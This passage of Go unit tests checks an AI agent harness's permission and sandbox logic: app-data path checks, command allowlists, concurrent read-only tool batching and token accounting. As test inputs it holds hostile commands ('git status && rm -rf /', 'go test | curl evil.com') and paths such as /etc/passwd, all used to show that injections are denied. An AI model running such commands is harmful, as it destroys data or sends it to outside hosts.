				t.Errorf("isAppDataDirPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestIsAppDataDirPath_AllowsKnowledgePaths(t *testing.T) {
	eng := &Engine{appDataDir: "/home/user/.divmora/localharness"}

	tests := []struct {
		name string
		path string
		want bool
	}{
		{
			name: "knowledge item metadata",
			path: "/home/user/.divmora/localharness/knowledge/proj-456/metadata.json",
			want: true,
		},
		{
			name: "knowledge item artifact",
			path: "/home/user/.divmora/localharness/knowledge/proj-456/artifacts/notes.md",
			want: true,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tc := llm.ToolCall{
				Name: "write_to_file",
				Args: map[string]interface{}{"path": tt.path},
			}
			got := eng.isAppDataDirPath(tc)
			if got != tt.want {
				t.Errorf("isAppDataDirPath(%q) = %v, want %v", tt.path, got, tt.want)
			}
		})
	}
}

func TestIsAppDataDirPath_DeniesProtectedPaths(t *testing.T) {
	eng := &Engine{appDataDir: "/home/user/.divmora/localharness"}

	tests := []struct {
		name string
		path string
	}{
		{
			name: "conversations protobuf",
			path: "/home/user/.divmora/localharness/conversations/abc-123.pb",
		},
		{
			name: "projects.json",
			path: "/home/user/.divmora/localharness/projects.json",
		},
		{
			name: "plugins directory",
			path: "/home/user/.divmora/localharness/plugins/my-plugin/SKILL.md",
		},
		{
			name: "skills directory",
			path: "/home/user/.divmora/localharness/skills/my-skill/SKILL.md",
		},
		{
			name: "appDataDir root itself",
			path: "/home/user/.divmora/localharness",
		},
		{
			name: "appDataDir with trailing slash trick",
			path: "/home/user/.divmora/localharness/",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			tc := llm.ToolCall{
				Name: "write_to_file",
				Args: map[string]interface{}{"path": tt.path},
			}
			got := eng.isAppDataDirPath(tc)
			if got {
				t.Errorf("isAppDataDirPath(%q) = true, want false — this path should NOT bypass policy", tt.path)
			}
		})
	}
}

func TestIsAppDataDirPath_EmptyAppDataDir(t *testing.T) {
	eng := &Engine{appDataDir: ""}

	tc := llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{"path": "/some/path/brain/file.md"},
	}
	if eng.isAppDataDirPath(tc) {
		t.Error("should return false when appDataDir is empty")
	}
}

func TestIsAppDataDirPath_DifferentArgKeys(t *testing.T) {
	eng := &Engine{appDataDir: "/data"}

	// Each file tool uses a different arg key for paths
	argKeys := map[string]string{
		"path":           "/data/brain/conv/file.md",
		"file_path":      "/data/brain/conv/file.md",
		"directory_path": "/data/brain/conv/",
		"search_path":    "/data/knowledge/proj/",
	}

	for key, path := range argKeys {
		t.Run("key_"+key, func(t *testing.T) {
			tc := llm.ToolCall{
				Name: "view_file",
				Args: map[string]interface{}{key: path},
			}
			if !eng.isAppDataDirPath(tc) {
				t.Errorf("isAppDataDirPath with arg key %q and path %q should return true", key, path)
			}
		})
	}
}

func TestIsAppDataDirPath_PrefixTrick(t *testing.T) {
	eng := &Engine{appDataDir: "/home/user/.divmora/localharness"}

	// "brain-evil" should NOT match "brain/"
	tc := llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{
			"path": "/home/user/.divmora/localharness/brain-evil/attack.sh",
		},
	}
	if eng.isAppDataDirPath(tc) {
		t.Error("brain-evil should not match brain/ prefix — missing separator check")
	}

	// "knowledge-evil" should NOT match "knowledge/"
	tc2 := llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{
			"path": "/home/user/.divmora/localharness/knowledge-evil/steal.sh",
		},
	}
	if eng.isAppDataDirPath(tc2) {
		t.Error("knowledge-evil should not match knowledge/ prefix — missing separator check")
	}
}

func TestEngine_AddAndRemoveWorkspace(t *testing.T) {
	ws1 := t.TempDir()
	ws2 := t.TempDir()

	// Write AGENTS.md to ws2
	agentsRuleContent := "# AGENTS.md for ws2\nAlways write tests."
	if err := os.WriteFile(filepath.Join(ws2, "AGENTS.md"), []byte(agentsRuleContent), 0644); err != nil {
		t.Fatal(err)
	}

	eng := NewEngine(Config{
		Provider: &mockProvider{
			responses: []*llm.GenerateResponse{
				{Content: "done", FinishReason: "stop"},
			},
		},
		Workspaces: []string{ws1},
		WorkspaceInfos: []WorkspaceInfo{
			{Directory: ws1, CorpusName: "corpus1"},
		},
		ConversationID: "conv-ws-test",
		TrajectoryID:   "traj-ws-test",
	})

	if len(eng.Workspaces()) != 1 || eng.Workspaces()[0] != ws1 {
		t.Fatalf("expected 1 initial workspace %s, got %v", ws1, eng.Workspaces())
	}
	if len(eng.msgCtx.Workspaces) != 1 {
		t.Fatalf("expected 1 msgCtx workspace, got %d", len(eng.msgCtx.Workspaces))
	}

	// Dynamically add ws2
	eng.AddWorkspace(ws2, WorkspaceInfo{Directory: ws2, CorpusName: "corpus2"})

	if len(eng.Workspaces()) != 2 {
		t.Fatalf("expected 2 workspaces after add, got %d", len(eng.Workspaces()))
	}
	if len(eng.msgCtx.Workspaces) != 2 {
		t.Fatalf("expected 2 msgCtx.Workspaces after add, got %d", len(eng.msgCtx.Workspaces))
	}
	if len(eng.msgCtx.UserRules) == 0 {
		t.Fatal("expected user rules to be loaded and synced to msgCtx.UserRules after adding ws2 with AGENTS.md")
	}

	// Dynamically remove ws2
	eng.RemoveWorkspace(ws2)

	if len(eng.Workspaces()) != 1 || eng.Workspaces()[0] != ws1 {
		t.Fatalf("expected 1 workspace %s after remove, got %v", ws1, eng.Workspaces())
	}
	if len(eng.msgCtx.Workspaces) != 1 {
		t.Fatalf("expected 1 msgCtx workspace after remove, got %d", len(eng.msgCtx.Workspaces))
	}
	if len(eng.msgCtx.UserRules) != 0 {
		t.Fatalf("expected 0 user rules after removing ws2, got %d", len(eng.msgCtx.UserRules))
	}
}

func TestEngine_PathScopedPermissions(t *testing.T) {
	wsDir := t.TempDir()
	appDataDir := t.TempDir()
	outsideDir := t.TempDir()

	wsFile := filepath.Join(wsDir, "inside.go")
	_ = os.WriteFile(wsFile, []byte("package main"), 0644)

	convFile := filepath.Join(appDataDir, "conversations", "conv-1.pb")
	_ = os.MkdirAll(filepath.Dir(convFile), 0755)
	_ = os.WriteFile(convFile, []byte("data"), 0644)

	outsideFile := filepath.Join(outsideDir, "secret.txt")
	_ = os.WriteFile(outsideFile, []byte("secret"), 0644)

	eng := &Engine{
		workspaces: []string{wsDir},
		appDataDir: appDataDir,
	}

	// 1. Inside workspace path -> auto-approved
	if !eng.isPathInsideWorkspaceOrAppData(wsFile) {
		t.Errorf("expected %s to be inside workspace", wsFile)
	}

	// 2. Inside AppDataDir (conversations) -> auto-approved
	if !eng.isPathInsideWorkspaceOrAppData(convFile) {
		t.Errorf("expected %s to be inside appDataDir", convFile)
	}

	// 3. Outside workspace path -> flagged as outside
	if eng.isPathInsideWorkspaceOrAppData(outsideFile) {
		t.Errorf("expected %s to be outside workspace and appDataDir", outsideFile)
	}
}

func TestConversationAndGlobalPermissionGrants(t *testing.T) {
	eng := &Engine{
		globalSettings: &config.GlobalSettings{
			AllowedCommands: []string{"git status", "go test"},
			AllowedTools:    []string{"view_file"},
		},
		permissionGrants: []PermissionGrant{
			{
				Action: "run_command",
				Target: "npm run build",
				Scope:  "conversation",
			},
		},
	}

	// 1. Global allowed command
	tcGlobalCmd := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "git status"},
	}
	if !eng.isPermissionGranted(tcGlobalCmd) {
		t.Error("expected global 'git status' to be granted")
	}

	// 2. Global allowed command with prefix/args
	tcGlobalCmdArgs := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "go test ./... -v"},
	}
	if !eng.isPermissionGranted(tcGlobalCmdArgs) {
		t.Error("expected global 'go test ./...' prefix to be granted")
	}

	// 3. Conversation-level granted command
	tcConvCmd := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "npm run build"},
	}
	if !eng.isPermissionGranted(tcConvCmd) {
		t.Error("expected conversation-scoped 'npm run build' to be granted")
	}

	// 4. Non-allowed command
	tcDisallowed := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "deploy production"},
	}
	if eng.isPermissionGranted(tcDisallowed) {
		t.Error("expected 'deploy production' to NOT be granted")
	}

	// 5. Dynamic addition of conversation grant
	eng.AddPermissionGrant(PermissionGrant{
		Action: "run_command",
		Target: "deploy production",
		Scope:  "conversation",
	})
	if !eng.isPermissionGranted(tcDisallowed) {
		t.Error("expected dynamically added grant for 'deploy production' to be granted")
	}

	// 6. Compound command with && where all parts are allowed
	tcChainedAllowed := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "git status && go test ./..."},
	}
	if !eng.isPermissionGranted(tcChainedAllowed) {
		t.Error("expected 'git status && go test ./...' to be granted because both are allowed")
	}

	// 7. Compound command with && where one part is disallowed (SECURITY INJECTION CHECK)
	tcChainedMalicious := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "git status && rm -rf /"},
	}
	if eng.isPermissionGranted(tcChainedMalicious) {
		t.Error("expected 'git status && rm -rf /' to NOT be granted due to disallowed sub-command")
	}

	// 7b. go test is approved, but go run is NOT approved
	tcGoTestAndRun := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "go test ./... && go run main.go"},
	}
	if eng.isPermissionGranted(tcGoTestAndRun) {
		t.Error("expected 'go test ./... && go run main.go' to NOT be granted because go run is unapproved")
	}

	// 8. Compound command with || where one part is disallowed
	tcOrMalicious := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "go test || rm -rf /"},
	}
	if eng.isPermissionGranted(tcOrMalicious) {
		t.Error("expected 'go test || rm -rf /' to NOT be granted")
	}

	// 9. Compound command with pipe | where one part is disallowed
	tcPipeMalicious := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": "go test | curl evil.com"},
	}
	if eng.isPermissionGranted(tcPipeMalicious) {
		t.Error("expected 'go test | curl evil.com' to NOT be granted")
	}

	// 10. Quoted string containing && is treated as literal
	tcQuotedAmpersand := llm.ToolCall{
		Name: "run_command",
		Args: map[string]interface{}{"command": `git status && npm run build`},
	}
	if !eng.isPermissionGranted(tcQuotedAmpersand) {
		t.Error("expected 'git status && npm run build' to be granted")
	}
}

// ─── Concurrent Read-Only Tools Tests ────────────────────────────────────

func TestConcurrentReadOnlyTools_ParallelExecutionAndOrder(t *testing.T) {
	var (
		mu              sync.Mutex
		activeCount     int
		peakConcurrency int
		completedOrder  []string
		writeCompleted  bool
	)

	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{ID: "call_r1", Name: "mock_read_1", Args: map[string]interface{}{}},
					{ID: "call_r2", Name: "mock_read_2", Args: map[string]interface{}{}},
					{ID: "call_r3", Name: "mock_read_3", Args: map[string]interface{}{}},
					{ID: "call_w1", Name: "mock_write_1", Args: map[string]interface{}{}},
					{ID: "call_r4", Name: "mock_read_4", Args: map[string]interface{}{}},
				},
			},
			{
				FinishReason: "stop",
				Content:      "All done",
			},
		},
	}

	wsDir := t.TempDir()
	wsMgr, err := workspace.NewManager([]string{wsDir})
	if err != nil {
		t.Fatal(err)
	}

	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(wsMgr, logger)

	makeReadTool := func(name string, delay time.Duration) tools.ToolFunc {
		return func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
			mu.Lock()
			activeCount++
			if activeCount > peakConcurrency {
				peakConcurrency = activeCount
			}
			mu.Unlock()

			select {
			case <-time.After(delay):
			case <-ctx.Done():
				return ctx.Err()
			}

			mu.Lock()
			activeCount--
			completedOrder = append(completedOrder, name)
			mu.Unlock()

			step.Text = fmt.Sprintf(`{"result":"%s_done"}`, name)
			return nil
		}
	}

	// Tool 1: 60ms delay
	// Tool 2: 30ms delay (finishes before 1 even though started in parallel)
	// Tool 3: 60ms delay
	reg.Register("mock_read_1", makeReadTool("mock_read_1", 60*time.Millisecond), tools.ToolSchema{Group: tools.ToolGroupRead})
	reg.Register("mock_read_2", makeReadTool("mock_read_2", 30*time.Millisecond), tools.ToolSchema{Group: tools.ToolGroupRead})
	reg.Register("mock_read_3", makeReadTool("mock_read_3", 60*time.Millisecond), tools.ToolSchema{Group: tools.ToolGroupRead})

	reg.Register("mock_write_1", func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
		mu.Lock()
		// Verify all 3 read tools in the first batch have finished before write starts (barrier)
		if len(completedOrder) != 3 {
			t.Errorf("expected 3 completed read tools before write barrier, got %d", len(completedOrder))
		}
		mu.Unlock()

		time.Sleep(20 * time.Millisecond)

		mu.Lock()
		writeCompleted = true
		completedOrder = append(completedOrder, "mock_write_1")
		mu.Unlock()

		step.Text = `{"result":"write_done"}`
		return nil
	}, tools.ToolSchema{Group: tools.ToolGroupWrite})

	reg.Register("mock_read_4", func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
		mu.Lock()
		if !writeCompleted {
			t.Error("mock_read_4 started before mock_write_1 completed")
		}
		completedOrder = append(completedOrder, "mock_read_4")
		mu.Unlock()

		step.Text = `{"result":"mock_read_4_done"}`
		return nil
	}, tools.ToolSchema{Group: tools.ToolGroupRead})

	brainDir := t.TempDir()
	eng := NewEngine(Config{
		Provider:                 provider,
		ToolRegistry:             reg,
		SystemPrompt:             "Test concurrent execution",
		ConversationID:           "test-conv",
		TrajectoryID:             "test-traj",
		BrainDir:                 brainDir,
		Logger:                   logger,
		MaxConcurrentToolWorkers: 4,
	})

	err = eng.Run(context.Background(), "Start prompt")
	if err != nil {
		t.Fatalf("eng.Run failed: %v", err)
	}

	mu.Lock()
	defer mu.Unlock()

	// 1. Peak concurrency for read batch (mock_read_1, 2, 3) must be at least 2 (parallel execution)
	if peakConcurrency < 2 {
		t.Errorf("expected peakConcurrency >= 2, got %d", peakConcurrency)
	}

	// 2. Because mock_read_2 has shorter delay (30ms vs 60ms), it completes before mock_read_1
	if len(completedOrder) != 5 {
		t.Fatalf("expected 5 tools in completedOrder, got %d: %v", len(completedOrder), completedOrder)
	}
	if completedOrder[0] != "mock_read_2" {
		t.Errorf("expected mock_read_2 to finish first due to shorter duration, but first was %s", completedOrder[0])
	}

	// 3. Crucial: History order MUST preserve LLM tool call order:
	// call_r1 (mock_read_1), call_r2 (mock_read_2), call_r3 (mock_read_3), call_w1 (mock_write_1), call_r4 (mock_read_4)
	var toolResultIDs []string
	for _, msg := range eng.history {
		if msg.Role == "tool" && msg.ToolResult != nil {
			toolResultIDs = append(toolResultIDs, msg.ToolResult.CallID)
		}
	}

	expectedIDs := []string{"call_r1", "call_r2", "call_r3", "call_w1", "call_r4"}
	if len(toolResultIDs) != len(expectedIDs) {
		t.Fatalf("expected %d tool results in history, got %d: %v", len(expectedIDs), len(toolResultIDs), toolResultIDs)
	}
	for i, expected := range expectedIDs {
		if toolResultIDs[i] != expected {
			t.Errorf("history[%d] CallID = %s, want %s (out of order!)", i, toolResultIDs[i], expected)
		}
	}
}

func TestConcurrentReadOnlyTools_WorkerPoolLimit(t *testing.T) {
	var (
		mu              sync.Mutex
		activeCount     int
		peakConcurrency int
	)

	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{ID: "c1", Name: "t1", Args: map[string]interface{}{}},
					{ID: "c2", Name: "t2", Args: map[string]interface{}{}},
					{ID: "c3", Name: "t3", Args: map[string]interface{}{}},
					{ID: "c4", Name: "t4", Args: map[string]interface{}{}},
				},
			},
			{
				FinishReason: "stop",
				Content:      "Done",
			},
		},
	}

	wsDir := t.TempDir()
	wsMgr, _ := workspace.NewManager([]string{wsDir})
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(wsMgr, logger)

	makeWorker := func() tools.ToolFunc {
		return func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
			mu.Lock()
			activeCount++
			if activeCount > peakConcurrency {
				peakConcurrency = activeCount
			}
			mu.Unlock()

			time.Sleep(40 * time.Millisecond)

			mu.Lock()
			activeCount--
			mu.Unlock()

			step.Text = `{"ok":true}`
			return nil
		}
	}

	reg.Register("t1", makeWorker(), tools.ToolSchema{Group: tools.ToolGroupRead})
	reg.Register("t2", makeWorker(), tools.ToolSchema{Group: tools.ToolGroupRead})
	reg.Register("t3", makeWorker(), tools.ToolSchema{Group: tools.ToolGroupRead})
	reg.Register("t4", makeWorker(), tools.ToolSchema{Group: tools.ToolGroupRead})

	eng := NewEngine(Config{
		Provider:                 provider,
		ToolRegistry:             reg,
		SystemPrompt:             "Test worker limit",
		ConversationID:           "test-conv",
		TrajectoryID:             "test-traj",
		BrainDir:                 t.TempDir(),
		Logger:                   logger,
		MaxConcurrentToolWorkers: 2, // Limit pool to 2 workers
	})

	err := eng.Run(context.Background(), "Run limit test")
	if err != nil {
		t.Fatalf("eng.Run failed: %v", err)
	}

	mu.Lock()
	defer mu.Unlock()
	if peakConcurrency > 2 {
		t.Errorf("expected peakConcurrency <= 2, got %d", peakConcurrency)
	}
}

func TestConcurrentReadOnlyTools_ErrorHandling(t *testing.T) {
	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			{
				FinishReason: "tool_calls",
				ToolCalls: []llm.ToolCall{
					{ID: "err_c1", Name: "read_ok_1", Args: map[string]interface{}{}},
					{ID: "err_c2", Name: "read_fail", Args: map[string]interface{}{}},
					{ID: "err_c3", Name: "read_ok_2", Args: map[string]interface{}{}},
				},
			},
			{
				FinishReason: "stop",
				Content:      "Handled error",
			},
		},
	}

	wsDir := t.TempDir()
	wsMgr, _ := workspace.NewManager([]string{wsDir})
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(wsMgr, logger)

	reg.Register("read_ok_1", func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
		time.Sleep(20 * time.Millisecond)
		step.Text = `{"status":"ok1"}`
		return nil
	}, tools.ToolSchema{Group: tools.ToolGroupRead})

	reg.Register("read_fail", func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
		time.Sleep(10 * time.Millisecond)
		return fmt.Errorf("read file not found")
	}, tools.ToolSchema{Group: tools.ToolGroupRead})

	reg.Register("read_ok_2", func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
		time.Sleep(20 * time.Millisecond)
		step.Text = `{"status":"ok2"}`
		return nil
	}, tools.ToolSchema{Group: tools.ToolGroupRead})

	eng := NewEngine(Config{
		Provider:                 provider,
		ToolRegistry:             reg,
		SystemPrompt:             "Test error handling",
		ConversationID:           "test-conv",
		TrajectoryID:             "test-traj",
		BrainDir:                 t.TempDir(),
		Logger:                   logger,
		MaxConcurrentToolWorkers: 4,
	})

	err := eng.Run(context.Background(), "Run error test")
	if err != nil {
		t.Fatalf("eng.Run failed: %v", err)
	}

	var results []*llm.ToolCallResult
	for _, msg := range eng.history {
		if msg.Role == "tool" && msg.ToolResult != nil {
			results = append(results, msg.ToolResult)
		}
	}

	if len(results) != 3 {
		t.Fatalf("expected 3 tool results, got %d", len(results))
	}

	if results[0].CallID != "err_c1" || results[0].IsError {
		t.Errorf("result 0 mismatch: %+v", results[0])
	}
	if results[1].CallID != "err_c2" || !results[1].IsError || !strings.Contains(results[1].Content, "read file not found") {
		t.Errorf("result 1 mismatch: %+v", results[1])
	}
	if results[2].CallID != "err_c3" || results[2].IsError {
		t.Errorf("result 2 mismatch: %+v", results[2])
	}
}

func TestConcurrentReadOnlyTools_PermissionBarrierClassification(t *testing.T) {
	wsDir := t.TempDir()
	wsMgr, _ := workspace.NewManager([]string{wsDir})
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(wsMgr, logger)
	tools.RegisterBuiltinTools(reg, nil)

	eng := NewEngine(Config{
		ToolRegistry:   reg,
		ConversationID: "test-conv",
		TrajectoryID:   "test-traj",
		BrainDir:       t.TempDir(),
		Logger:         logger,
		Workspaces:     []string{wsDir},
		PermissionHandler: func(ctx context.Context, req *pb.ActionPermissionRequest) (bool, string, error) {
			return true, "", nil
		},
	})

	// 1. Read-only tool inside workspace -> concurrent read-only
	inWsPath := filepath.Join(wsDir, "file.txt")
	if !eng.isConcurrentReadOnlyTool(llm.ToolCall{
		Name: "view_file",
		Args: map[string]interface{}{"path": inWsPath},
	}) {
		t.Error("expected view_file inside workspace to be concurrent read-only")
	}

	// 2. Read-only tool outside workspace -> requires permission check, NOT concurrent read-only
	outWsPath := "/etc/passwd"
	if eng.isConcurrentReadOnlyTool(llm.ToolCall{
		Name: "view_file",
		Args: map[string]interface{}{"path": outWsPath},
	}) {
		t.Error("expected view_file outside workspace to NOT be concurrent read-only (permission barrier)")
	}

	// 3. Mutating tool inside workspace -> NOT concurrent read-only
	if eng.isConcurrentReadOnlyTool(llm.ToolCall{
		Name: "write_to_file",
		Args: map[string]interface{}{"path": inWsPath},
	}) {
		t.Error("expected write_to_file to NOT be concurrent read-only")
	}

	// 4. Desktop tool -> NOT concurrent read-only
	if eng.isConcurrentReadOnlyTool(llm.ToolCall{
		Name: "desktop_screenshot",
		Args: map[string]interface{}{},
	}) {
		t.Error("expected desktop_screenshot to NOT be concurrent read-only")
	}
}

func TestTokenUsageDeduplication_MultiToolTurn(t *testing.T) {
	wsDir := t.TempDir()
	wsMgr, err := workspace.NewManager([]string{wsDir})
	if err != nil {
		t.Fatalf("workspace.NewManager failed: %v", err)
	}
	logger := slog.New(slog.NewTextHandler(os.Stderr, &slog.HandlerOptions{Level: slog.LevelError}))
	reg := tools.NewRegistry(wsMgr, logger)

	reg.Register("read_tool_1", func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
		step.Text = `{"result":"r1"}`
		return nil
	}, tools.ToolSchema{Group: tools.ToolGroupRead})

	reg.Register("read_tool_2", func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
		step.Text = `{"result":"r2"}`
		return nil
	}, tools.ToolSchema{Group: tools.ToolGroupRead})

	reg.Register("write_tool_1", func(ctx context.Context, step *pb.StepUpdate, r *tools.Registry) error {
		step.Text = `{"result":"w1"}`
		return nil
	}, tools.ToolSchema{Group: tools.ToolGroupWrite})

	provider := &mockProvider{
		responses: []*llm.GenerateResponse{
			// Turn 0: 3 tool calls in a single generation
			{
				ToolCalls: []llm.ToolCall{
					{ID: "c1", Name: "read_tool_1", Args: map[string]interface{}{}},
					{ID: "c2", Name: "read_tool_2", Args: map[string]interface{}{}},
					{ID: "c3", Name: "write_tool_1", Args: map[string]interface{}{}},
				},
				Usage: llm.Usage{
					PromptTokens:     100,
					CompletionTokens: 20,
					TotalTokens:      120,
				},
				FinishReason: "tool_calls",
			},
			// Turn 1: Final text response
			{
				Content: "All tools executed successfully.",
				Usage: llm.Usage{
					PromptTokens:     150,
					CompletionTokens: 30,
					TotalTokens:      180,
				},
				FinishReason: "stop",
			},
		},
	}

	convMgr, err := conversation.NewManager(t.TempDir())
	if err != nil {
		t.Fatalf("conversation.NewManager failed: %v", err)
	}
	conv, err := convMgr.Create(&pb.HarnessConfig{})
	if err != nil {
		t.Fatalf("convMgr.Create failed: %v", err)
	}
	defer conv.Close()

	var mu sync.Mutex
	var doneSteps []*pb.StepUpdate
	onStep := func(step *pb.StepUpdate) {
		if step.State == pb.StepUpdate_STATE_DONE {
			mu.Lock()
			doneSteps = append(doneSteps, step)
			mu.Unlock()
		}
	}

	eng := NewEngine(Config{
		Provider:                 provider,
		ToolRegistry:             reg,
		ConversationID:           conv.ID,
		TrajectoryID:             "test-traj-usage",
		Conversation:             conv,
		OnStep:                   onStep,
		Logger:                   logger,
		Workspaces:               []string{wsDir},
		MaxConcurrentToolWorkers: 4,
	})

	if err := eng.Run(context.Background(), "Execute tools"); err != nil {
		t.Fatalf("eng.Run failed: %v", err)
	}

	// 1. Verify Conversation.State.TotalUsage
	if conv.State.TotalUsage == nil {
		t.Fatal("expected TotalUsage to be non-nil")
	}

	expectedPrompt := int32(100 + 150)
	expectedCompletion := int32(20 + 30)
	expectedTotal := int32(120 + 180)

	if conv.State.TotalUsage.PromptTokens != expectedPrompt {
		t.Errorf("expected PromptTokens %d, got %d", expectedPrompt, conv.State.TotalUsage.PromptTokens)
	}
	if conv.State.TotalUsage.CompletionTokens != expectedCompletion {
		t.Errorf("expected CompletionTokens %d, got %d", expectedCompletion, conv.State.TotalUsage.CompletionTokens)
	}
	if conv.State.TotalUsage.TotalTokens != expectedTotal {
		t.Errorf("expected TotalTokens %d (deduplicated across tool calls), got %d", expectedTotal, conv.State.TotalUsage.TotalTokens)
	}

	// 2. Verify StepUpdate Usage distribution:
	// Turn 0 had 3 tool calls. Exactly ONE of them should have Usage != nil (with 120 total tokens).
	// Turn 1 had 1 final response with Usage != nil (with 180 total tokens).
	mu.Lock()
	defer mu.Unlock()

	var stepsWithUsage []*pb.StepUpdate
	for _, s := range doneSteps {
		if s.Usage != nil {
			stepsWithUsage = append(stepsWithUsage, s)
		}
	}

	if len(stepsWithUsage) != 2 {
		t.Fatalf("expected exactly 2 steps with Usage (1 for turn 0 tool batch, 1 for turn 1 final response), got %d", len(stepsWithUsage))
	}

	if stepsWithUsage[0].Usage.TotalTokens != 120 {
		t.Errorf("expected first usage step to have 120 tokens, got %d", stepsWithUsage[0].Usage.TotalTokens)
	}
	if stepsWithUsage[1].Usage.TotalTokens != 180 {
		t.Errorf("expected second usage step to have 180 tokens, got %d", stepsWithUsage[1].Usage.TotalTokens)
	}
}
